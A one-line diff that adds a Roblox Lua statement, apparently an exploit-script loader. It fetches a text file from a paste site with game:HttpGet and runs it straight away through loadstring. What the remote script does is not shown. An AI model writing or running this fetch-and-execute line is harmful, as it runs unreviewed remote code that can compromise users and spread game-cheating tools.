@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://paste.myconan.net/489138.txt", true))()
